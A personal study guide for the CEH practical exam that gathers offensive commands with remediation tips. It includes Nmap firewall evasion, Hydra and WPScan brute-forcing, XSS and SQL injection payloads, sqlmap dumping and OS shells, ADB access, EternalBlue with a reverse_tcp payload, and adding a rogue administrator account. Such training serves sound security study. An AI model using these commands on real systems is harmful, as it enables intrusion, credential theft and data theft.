My CEH Practical Reference Notes
This is my personal guide for the CEH practical, built from three CEH repos to cover all the commands and steps. It has comments explaining what each command does and examples like IPs (192.168.1.10), subnets (192.168.1.0/24), or domains (example.com) to make it clear. Run sudo su to be root when needed.
Reference Repositories:

DarkLycn1976/CEH-Practical-Notes-and-Tools
infovault-Ytube/CEH-Practical-Notes
dhabaleshwar/CEHPractical


Scanning Networks

Note: This whole section collapses to hide scanning steps. Expand to see tools like Nmap.

Nmap Commands
1- Scan for active hosts (from DarkLycn1976, dhabaleshwar):
# Scan entire subnet to find active hosts, includes OS, version, scripts, traceroute
nmap -A 192.168.1.0/24
# Faster scan for one IP, aggressive mode
nmap -T4 -A 192.168.1.10
# Same as above but shows why ports are open/closed
nmap -T4 -A --reason 192.168.1.10

2- TCP connect scan (from dhabaleshwar):
# Full TCP scan on all ports, verbose output, for one IP
nmap -sT -v 192.168.1.10

3- Stealth scan for firewalls/IDS (from DarkLycn1976):
# SYN scan, sends half-open connections to avoid detection, verbose
nmap -sS -v 192.168.1.10
# If blocked, use fragmented packets to bypass some firewalls
nmap -f 192.168.1.10

4- OS and service detection (from dhabaleshwar):
# Detect OS and open ports for one IP
nmap -O 192.168.1.10
# Aggressive scan, includes OS, service versions, scripts, traceroute
nmap -A 192.168.1.10

5- Source port manipulation (from DarkLycn1976):
# Scan using source port 80 to bypass some firewall rules
nmap -g 80 192.168.1.10

Remediation:

Close unused ports (e.g., found by nmap -sV).
Configure firewalls to block unauthorized scans.
Use IDS to detect scanning attempts.
Patch services identified by -sV.

Enumeration

Note: This section collapses to hide enumeration steps. Expand to see tools like Nmap, enum4linux.

Nmap for Enumeration
1- NetBIOS enumeration (from dhabaleshwar):
# Get NetBIOS names and MAC address for a Windows host, verbose
nmap -sV -v --script nbstat.nse 192.168.1.10

2- SNMP enumeration (from DarkLycn1976):
# Check if SNMP port 161 is open on a device
nmap -sU -p 161 192.168.1.10
# Get detailed SNMP info (users, processes) on Parrot OS
snmp-check 192.168.1.10

Other Enumeration Tools
3- DNS enumeration (from infovault-Ytube):
# Check DNS records for a domain, attempt zone transfer
dnsrecon -d example.com -z

4- SMB enumeration (from DarkLycn1976):
# Get OS, computer name, domain via SMB (ports 445 or 139)
nmap --script smb-os-discovery.nse 192.168.1.10
# Get detailed SMB info (users, shares) with credentials
enum4linux -u "user1" -p "pass123" -n 192.168.1.10

Remediation:

Disable NetBIOS and SMB if not needed (ports 137-139, 445).
Restrict SNMP (port 161) and use strong community strings.
Use strong passwords for SMB accounts.
Secure DNS servers to block zone transfers.

Steganography

Note: This section collapses to hide steganography steps. Expand to see Snow, OpenStego.

Snow
1- Hide data in text (from infovault-Ytube):
# Hide a secret message in readme2.txt, use 'magic' as password
snow -C -m "My secret code: 123456" -p "magic" readme.txt readme2.txt

2- Extract hidden data:
# Reveal the hidden message in readme2.txt using password
snow -C -p "magic" readme2.txt

OpenStego
3- Hide data in images (from dhabaleshwar):

Install OpenStego:

# Install OpenStego on Parrot OS
sudo apt install openstego


Hide data:

# Embed secret.txt in cover.png, output to output.png, use 'password123'
openstego embed -mf secret.txt -cf cover.png -p password123 -sf output.png


Extract data:

# Extract hidden data from output.png to output_dir, use 'password123'
openstego extract -sf output.png -p password123 -xd output_dir

Remediation:

Scan uploaded files for hidden data with tools like Stegdetect.
Use file integrity checks to detect tampering.
Restrict unverified file uploads on servers.

Sniffing

Note: This section collapses to hide sniffing steps. Expand to see Wireshark.

Wireshark
1- Password sniffing (from dhabaleshwar):
# Filter HTTP POST requests to find login data
http.request.method == POST


Steps: Open a pcap file in Wireshark, apply the filter, go to Edit > Find Packet, select “string”, choose “Packet details”, set “Narrow UTF-8 & ASCII”, search for “pwd”. Or use Tools > Credentials to view passwords.

2- Network analysis for DoS (from infovault-Ytube):
# Count devices sending SYN packets (potential scanners)
tcp.flags.syn == 1 and tcp.flags.ack == 0
# Identify a single device causing a DoS (flooding SYN packets)
tcp.flags.syn == 1


Steps: In Wireshark, go to Statistics > IPv4 Addresses > Source and Destination, apply the filter to analyze traffic.

Remediation:

Enforce HTTPS to encrypt web traffic.
Encrypt sensitive data in transit.
Deploy IDS to detect DoS attacks.
Rate-limit incoming traffic to prevent floods.

Hacking Web Servers

Note: This section collapses to hide web server hacking steps. Expand to see Netcat, Nmap, Hydra.

Netcat
1- Footprinting web server (from dhabaleshwar):
# Connect to web server to grab its banner (e.g., Apache version)
nc -vv example.com 80
GET / HTTP/1.0

Nmap
2- Enumerate web server (from DarkLycn1976):
# Find web server software (e.g., Apache, Nginx) and enumerate directories
nmap -sV --script=http-enum example.com

Hydra
3- Crack FTP credentials (from dhabaleshwar, DarkLycn1976):
# Check if FTP port 21 is open on the target
nmap -p 21 192.168.1.10
# Try connecting to FTP to see if it allows anonymous login
ftp 192.168.1.10
# Brute-force FTP with username and password lists
hydra -L /home/user/wordlists/usernames.txt -P /home/user/wordlists/passwords.txt ftp://192.168.1.10
# Brute-force with a single known username
hydra -l user1 -P /home/user/wordlists/passwords.txt ftp://192.168.1.10
# Try common admin credentials for quick wins
hydra -l admin -P /home/user/wordlists/passwords.txt ftp://192.168.1.10

Remediation:

Hide server banners in configuration (e.g., Apache’s ServerTokens).
Disable anonymous FTP access.
Enforce strong passwords and account lockout policies.
Patch web server software regularly.

Hacking Web Applications

Note: This section collapses to hide web app hacking steps. Expand to see OWASP ZAP, Gobuster, WPScan, Metasploit, Burp Suite, XSS.

OWASP ZAP
1- Automated scanning (from infovault-Ytube):
# Launch OWASP ZAP graphical interface
zaproxy


Steps: Type zaproxy in the terminal, enter http://example.com in the target tab, click “Automated Scan” to find vulnerabilities like XSS or SQLi.

Gobuster
2- Directory brute-forcing (from DarkLycn1976):
# Find hidden directories or files on a web server
gobuster dir -u http://192.168.1.10 -w /home/user/wordlists/common.txt

WPScan and Metasploit
3- Enumerate WordPress (from dhabaleshwar):
# Find WordPress usernames on a target site
wpscan --url http://192.168.1.10:8080/wordpress --enumerate u

4- Brute-force WordPress (from DarkLycn1976):
# Brute-force login with a known username
wpscan --url http://192.168.1.10:8080/wordpress -u admin -P /home/user/wordlists/passwords.txt
# Brute-force with username and password lists
wpscan --url http://192.168.1.10:8080/wordpress --usernames /home/user/wordlists/usernames.txt --passwords /home/user/wordlists/passwords.txt

5- Metasploit WordPress scan (from DarkLycn1976):
# Launch Metasploit console
msfconsole
# Use WordPress login brute-forcer
use auxiliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE /home/user/wordlists/passwords.txt
set RHOSTS 192.168.1.10
set RPORT 8080
set TARGETURI http://192.168.1.10:8080/wordpress
set USERNAME admin
run

Burp Suite
6- Manual testing (from infovault-Ytube):
# Launch Burp Suite graphical interface
burpsuite


Steps: Set browser proxy to 127.0.0.1:8080, enable Intercept in Burp’s Proxy tab, visit http://example.com, capture requests, test parameters (e.g., search=) for XSS or SQLi.

Reflected XSS Testing
7- XSS testing (inspired by infovault-Ytube, OWASP guidelines from Memories: April 21, 2025, 01:12):

Test 1: Basic XSS:
Payload:



<script>alert('XSS')</script>


Steps: Inject payload in a search field or URL (e.g., http://example.com?q=<payload>). If an alert pops, it’s vulnerable. Use Burp Suite to intercept and test.
Insecure Code:

<?php echo $_GET['q']; ?>


Secure Code:

<?php echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); ?>


Test 2: XSS in JSON:
Payload:



"><script>alert('XSS')</script>


Steps: Use Burp Suite to intercept an API request (e.g., http://example.com/api?search=<payload>), inject payload in the search parameter, check if the response executes the script.
Insecure Code:

res.json({ result: req.query.search });


Secure Code:

res.json({ result: sanitize(req.query.search) });


Test 3: XSS in URL Fragments:
Payload:



#<script>alert('XSS')</script>


Steps: Add to URL (e.g., http://example.com/page#<payload>), check for an alert.
Insecure Code:

document.write(location.hash);


Secure Code:

document.write(escape(location.hash));

Remediation:

Sanitize all user inputs with libraries like DOMPurify.
Implement Content Security Policy (CSP) to block unauthorized scripts.
Escape outputs in HTML, JSON, and JavaScript.
Keep WordPress and plugins updated.
Restrict access to sensitive directories (e.g., /admin).
Prevent command execution in input fields.

SQL Injections

Note: This section collapses to hide SQL injection steps. Expand to see SQLMap.

SQLMap
1- Auth bypass (from dhabaleshwar):
# Bypass login by making the query always true
' OR 1=1 --


Steps: Enter in a login form’s username field (e.g., admin' OR 1=1 --) to bypass authentication.

2- Insert new user (from infovault-Ytube):
# Add a new user to the database via login form
'; INSERT INTO users (username, password) VALUES ('john', 'apple123'); --


Steps: Inject in the username field of a vulnerable login form.

3- Blind SQL injection (from infovault-Ytube):
# Get session cookies from the browser’s developer console
document.cookie

# Find all databases on a vulnerable web app
sqlmap -u "http://example.com/profile?id=1" --cookie="session=abc123" --dbs

4- List tables:
# List tables in a specific database (e.g., 'webapp_db')
sqlmap -u "http://example.com/profile?id=1" --cookie="session=abc123" -D webapp_db --tables

5- Dump data:
# Dump data (e.g., usernames, passwords) from a table (e.g., 'users')
sqlmap -u "http://example.com/profile?id=1" --cookie="session=abc123" -D webapp_db -T users --dump

6- Get OS shell (from dhabaleshwar):
# Gain a command shell on the server
sqlmap -u "http://example.com/profile?id=1" --cookie="session=abc123" --os-shell


In shell:

# List running processes (Windows)
TASKLIST
# Get Windows OS version
systeminfo
# Get Linux OS version
uname -a

Remediation:

Use parameterized queries in all database operations.
Escape user inputs properly.
Limit database user permissions to minimum needed.
Deploy a Web Application Firewall (WAF).

Android Hacking

Note: This section collapses to hide Android hacking steps. Expand to see Nmap, ADB.

Nmap and ADB
1- Scan for ADB port (from DarkLycn1976):
# Check if Android Debug Bridge port 5555 is open
nmap -sV -p 5555 192.168.1.100

2- Connect to ADB (from infovault-Ytube):
# Connect to an Android device over the network
adb connect 192.168.1.100:5555

3- Access device (from infovault-Ytube):
# Access the Android device’s shell
adb shell
# Show current directory
pwd
# List files in current directory
ls
# Navigate to the sdcard directory
cd sdcard
ls
# Read a file (e.g., a secret note)
cat secret.txt
# If not found, check the Downloads folder
cd downloads
ls

Remediation:

Disable ADB and USB debugging on Android devices.
Block network access to port 5555 with a firewall.

Wi-Fi Cracking

Note: This section collapses to hide Wi-Fi cracking steps. Expand to see Aircrack-ng.

Aircrack-ng
1- Crack Wi-Fi passwords (from DarkLycn1976):
# Crack a WEP network using a captured pcap file
aircrack-ng capture_wep.pcap
# Crack a WPA2 network with a wordlist and captured handshake
aircrack-ng -a2 -b 00:14:22:33:44:55 -w /home/user/wordlists/passwords.txt capture_wpa2.pcap

Remediation:

Use WPA3 or strong WPA2 passwords (e.g., 20+ characters).
Enable MAC address filtering on the router.
Disable WEP, as it’s insecure.

Privilege Escalation

Note: This section collapses to hide privilege escalation steps. Expand to see Metasploit, manual commands.

Metasploit
1- Exploit vulnerabilities (from DarkLycn1976):
# Launch Metasploit console
msfconsole
# Search for exploits (e.g., for SMB)
search smb
# Use an exploit (e.g., EternalBlue)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/meterpreter/reverse_tcp
run

Manual Commands
2- Windows privilege escalation (from dhabaleshwar):
# Check current user’s privileges
whoami
# List all user accounts
net user
# Add a new user
net user hacker password123 /add
# Add the user to the Administrators group
net localgroup Administrators hacker /add

Remediation:

Apply security patches regularly.
Use least privilege accounts for daily operations.
Monitor for unauthorized user accounts or privilege changes.

Extra Checks

Note: This section collapses to hide extra checks. Expand to see Nmap.

Nmap
1- Check RDP (from DarkLycn1976):
# Scan a list of IPs for open RDP port 3389
nmap -p 3389 -iL /home/user/ip_list.txt | grep open

2- Check MySQL (from dhabaleshwar):
# Scan a list of IPs for open MySQL port 3306
nmap -p 3306 -iL /home/user/ip_list.txt | grep open

Remediation:

Disable RDP and MySQL services if not needed.
Restrict access to ports 3389 (RDP) and 3306 (MySQL) with firewalls.
Use strong credentials for MySQL accounts.

Remediation Summary

Network: Block unused ports, configure firewalls, use IDS for monitoring.
Web Apps: Sanitize inputs, implement CSP, escape outputs, update software.
Database: Use parameterized queries, limit permissions.
Wi-Fi: Enforce strong passwords, use WPA3, enable MAC filtering.
General: Patch systems, use complex passwords, perform regular pentests.

Last updated: April 2025
